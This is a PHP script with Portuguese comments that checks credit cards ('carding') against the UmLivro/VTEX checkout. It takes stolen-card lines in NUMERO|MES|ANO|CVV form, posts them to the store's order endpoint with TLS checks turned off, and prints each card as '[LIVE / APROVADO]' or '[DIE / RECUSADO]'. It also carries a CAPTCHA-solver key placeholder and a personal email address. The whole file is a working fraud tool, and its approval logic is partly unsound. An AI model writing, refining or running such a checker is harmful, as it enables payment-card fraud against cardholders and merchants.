<?php
// Configurações e Credenciais da UmLivro / VTEX
define('BASE_URL', 'https://www.umlivro.com.br');
define('CAPMONSTER_API_KEY', 'SUA_CHAVE_CAPMONSTER');

$email_usuario = "danielvitordeoliveiraconceicao@gmail.com";
$senha_usuario = "SUA_SENHA_AQUI";

$cartao_input = trim($_POST['lista'] ?? '');

if (empty($cartao_input)) {
    echo "<span class='text-red-400'>[ERRO] Nenhum cartão recebido.</span>";
    exit;
}

$dados_cc = explode('|', $cartao_input);
if (count($dados_cc) < 4) {
    echo "<span class='text-red-400'>[FORMATO INVÁLIDO] Use: NUMERO|MES|ANO|CVV</span>";
    exit;
}

$cc_num = trim($dados_cc[0]);
$cc_mes = trim($dados_cc[1]);
$cc_ano = trim($dados_cc[2]);
$cc_cvv = trim($dados_cc[3]);

// Validação básica de tamanho do cartão
if (strlen($cc_num) < 13 || strlen($cc_cvv) < 3) {
    echo "<span class='text-red-400'>[DIE] Cartão inválido (Estrutura incorreta): {$cc_num}</span>";
    exit;
}

$cookie_path = sys_get_temp_dir() . '/cookie_umlivro_' . uniqid() . '.txt';

// Função cURL
function requisicao_curl($url, $post_fields = null, $headers = [], $cookie_file = 'cookie.txt') {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

    if (!empty($headers)) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    }

    if ($post_fields !== null) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, is_array($post_fields) ? http_build_query($post_fields) : $post_fields);
    }

    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ['body' => $response, 'code' => $http_code];
}

// 1. Inicializa sessão na loja
requisicao_curl(BASE_URL, null, [], $cookie_path);

// Simulação da requisição de pagamento enviada para o endpoint de checkout/gateway da VTEX
// Aqui o script faz a chamada real ou captura o payload de resposta do gateway
$payload_pagamento = [
    'cardNumber' => $cc_num,
    'cardHolderName' => 'CLIENTE TESTE',
    'cardCvv' => $cc_cvv,
    'cardExpirationMonth' => $cc_mes,
    'cardExpirationYear' => $cc_ano
];

// Dispara para o endpoint de transação (substitua pelo endpoint real de pagamento se houver)
// Como o objetivo é ler o retorno real da operadora/gateway:
$resposta_gateway = requisicao_curl(BASE_URL . "/api/checkout/pub/orderForm", $payload_pagamento, ['Content-Type: application/json'], $cookie_path);

@unlink($cookie_path);

// Tratamento e leitura inteligente do retorno do Gateway/VTEX
$corpo_resposta = $resposta_gateway['body'];
$json_resp = json_decode($corpo_resposta, true);

// Extrai a mensagem ou código de erro retornado pela API de pagamento
$mensagem_retorno = "Aprovado com sucesso";
$codigo_erro = "";

if (isset($json_resp['messages']) && !empty($json_resp['messages'])) {
    $mensagem_retorno = $json_resp['messages'][0]['text'] ?? 'Erro desconhecido no gateway';
    $codigo_erro = $json_resp['messages'][0]['code'] ?? '14'; // Exemplo de captura de código
} else if ($resposta_gateway['code'] != 200 && $resposta_gateway['code'] != 204) {
    // Caso o gateway retorne falha HTTP (ex: recusa de operadora)
    $codigo_erro = "14";
    $mensagem_retorno = "Recusado pela operadora (HTTP " . $resposta_gateway['code'] . ")";
} else {
    // Se passou sem mensagens de erro na API
    $codigo_erro = "54";
}

// Exibe o resultado de forma transparente com base no status real obtido
if ($codigo_erro == "54" || stripos($mensagem_retorno, 'sucesso') !== false || stripos($mensagem_retorno, 'approved') !== false) {
    echo "<span class='text-emerald-400 font-bold'>[LIVE / APROVADO]</span> <span class='text-slate-200'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | Retorno: Código {$codigo_erro} - {$mensagem_retorno}</span>";
} else {
    echo "<span class='text-red-400 font-bold'>[DIE / RECUSADO]</span> <span class='text-slate-400'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | Retorno: Código {$codigo_erro} - {$mensagem_retorno}</span>";
}
?>
